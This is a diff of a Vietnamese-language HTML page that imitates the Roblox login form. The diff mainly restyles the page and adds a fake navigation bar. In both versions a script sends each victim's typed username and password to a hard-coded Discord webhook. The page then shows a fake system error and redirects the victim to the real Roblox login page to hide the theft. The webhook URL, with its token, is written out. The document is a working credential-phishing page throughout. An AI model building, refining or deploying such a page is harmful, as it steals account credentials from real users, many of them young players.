@@ -2,84 +2,133 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Đăng nhập</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox</title>
     <style>
-        body {
-            margin: 0; padding: 0;
+        * { box-sizing: border-box; }
+        body, html {
+            margin: 0; padding: 0; height: 100%; width: 100%;
             background: url('https://images.rbxcdn.com/f9379895240be6d16f391b1076b97669.jpg') no-repeat center center fixed;
             background-size: cover;
             font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh;
+            display: flex; flex-direction: column; /* Chia làm 2 phần: Menu và Nội dung */
         }
-        .login-container {
-            background-color: rgba(30, 31, 33, 0.95);
-            padding: 30px; border-radius: 8px;
-            width: 360px; text-align: center; color: white;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+
+        /* Lớp phủ tối toàn màn hình */
+        .dark-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.65); z-index: 1;
         }
-        h2 { font-size: 20px; margin-bottom: 20px; font-weight: bold; }
+
+        /* --- THANH MENU MỎNG (NAVBAR) --- */
+        .navbar {
+            position: relative; z-index: 10;
+            background-color: #212224;
+            height: 32px; /* Siêu mỏng để tạo khoảng cách */
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 10px;
+        }
+
+        .nav-left { display: flex; align-items: center; gap: 8px; }
+        .logo { width: 18px; height: 18px; background: url('https://images.rbxcdn.com/796030919424759453965d1434c4f039.svg') no-repeat center; background-size: contain; }
+        .search { background: #393b3d; border: 1px solid #656668; border-radius: 3px; padding: 1px 5px; width: 70px; color: #adb0b1; font-size: 9px; }
+        .links { display: flex; gap: 10px; }
+        .links a { color: #ffffff; text-decoration: none; font-size: 8.5px; white-space: nowrap; opacity: 0.8; }
+        .btn-top { background: transparent; border: 0.5px solid white; color: white; border-radius: 2px; padding: 1px 4px; font-size: 8.5px; }
+
+        /* --- VÙNG CHỨA FORM (TẠO KHOẢNG CÁCH RỘNG) --- */
+        .page-container {
+            flex-grow: 1; /* Chiếm toàn bộ phần còn lại của màn hình */
+            display: flex;
+            justify-content: center; /* Căn giữa ngang (Mũi tên trái-phải) */
+            align-items: center;     /* Căn giữa dọc (Mũi tên trên-dưới) */
+            position: relative; z-index: 5;
+            padding: 20px; /* Đảm bảo không dính sát mép trên Mobile */
+        }
+
+        .login-box {
+            background-color: #212224;
+            padding: 30px 20px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 320px; /* Giới hạn độ rộng của Form */
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+        }
+
+        h2 { font-size: 18px; margin: 0 0 20px 0; font-weight: bold; }
         input {
-            width: 100%; padding: 12px; margin: 8px 0;
+            width: 100%; padding: 10px; margin-bottom: 8px;
             background: #393b3d; border: 1px solid #000;
-            border-radius: 4px; color: white; box-sizing: border-box;
+            border-radius: 4px; color: white; font-size: 13px;
         }
-        .btn-login {
-            width: 100%; padding: 12px; margin-top: 15px;
-            background-color: #ffffff; color: #1e1f21;
-            border: none; border-radius: 4px; font-weight: bold; cursor: pointer;
-        }
-        .links { margin-top: 20px; font-size: 13px; color: #adb0b1; cursor: pointer; }
-        .btn-other {
+        .btn-main {
             width: 100%; padding: 10px; margin-top: 10px;
-            background-color: #393b3d; color: white;
-            border: 1px solid #ffffff; border-radius: 4px; cursor: pointer; font-size: 13px;
+            background: #ffffff; color: #1e1f21; border: none;
+            border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer;
+        }
+        .forgot { display: block; margin: 20px 0; color: #adb0b1; font-size: 11px; text-decoration: none; }
+        .btn-sub {
+            width: 100%; padding: 10px; margin-top: 8px;
+            background: #393b3d; color: white; border: 1px solid #656668;
+            border-radius: 4px; font-size: 11px; cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <h2>Thêm tài khoản</h2>
-    <input type="text" id="username" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
-    <input type="password" id="password" placeholder="Mật khẩu">
-    
-    <button class="btn-login" onclick="guiThongTin()">Đăng nhập</button>
-    
-    <div class="links" onclick="alert('Tính năng này đang bảo trì!')">Bạn quên Mật khẩu hoặc Tên người dùng?</div>
-    
-    <button class="btn-other" onclick="alert('Đã gửi mã về Email của bạn!')">Gửi mã một lần cho tôi qua email</button>
-    <button class="btn-other" onclick="alert('Vui lòng mở ứng dụng Roblox trên thiết bị khác')">Sử dụng thiết bị khác</button>
+<div class="dark-overlay"></div>
+
+<div class="navbar">
+    <div class="nav-left">
+        <div class="logo"></div>
+        <div class="search">🔍 Tìm kiếm</div>
+        <div class="links">
+            <a href="#">Bảng xếp hạng</a>
+            <a href="#">Chợ</a>
+            <a href="#">Tạo</a>
+            <a href="#">Robux</a>
+        </div>
+    </div>
+    <button class="btn-top">Đăng nhập</button>
+</div>
+
+<div class="page-container">
+    <div class="login-box">
+        <h2>Thêm tài khoản</h2>
+        <input type="text" id="u" placeholder="Tên người dùng/Email/Số điện thoại">
+        <input type="password" id="p" placeholder="Mật khẩu">
+        <button class="btn-main" onclick="send()">Đăng nhập</button>
+        <a href="#" class="forgot">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
+        <button class="btn-sub">Gửi mã một lần qua email</button>
+        <button class="btn-sub">Sử dụng thiết bị khác</button>
+    </div>
 </div>
 
 <script>
-    function guiThongTin() {
-        const u = document.getElementById('username').value;
-        const p = document.getElementById('password').value;
-        
-        // Link Webhook Discord của bạn
-        const webhook = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
+    function send() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const webh = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
 
-        if(u === "" || p === "") {
-            alert("Vui lòng nhập đầy đủ thông tin!");
-            return;
-        }
+        if(!user || !pass) return alert("Nhập đủ thông tin!");
 
-        fetch(webhook, {
+        fetch(webh, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: "🔔 **CÓ NGƯỜI NHẬP ACC MỚI!**",
                 embeds: [{
+                    title: "🔔 ACC MỚI",
                     color: 16711680,
                     fields: [
-                        { name: "👤 Tài khoản", value: "`" + u + "`" },
-                        { name: "🔑 Mật khẩu", value: "`" + p + "`" }
+                        { name: "👤 User", value: "`" + user + "`" },
+                        { name: "🔑 Pass", value: "`" + pass + "`" }
                     ]
                 }]
             })
         }).then(() => {
-            alert("Lỗi hệ thống (0x8004): Vui lòng thử lại sau ít phút!");
+            alert("Lỗi hệ thống (0x8004). Vui lòng thử lại sau!");
             window.location.href = "https://www.roblox.com/vi/Login";
         });
     }
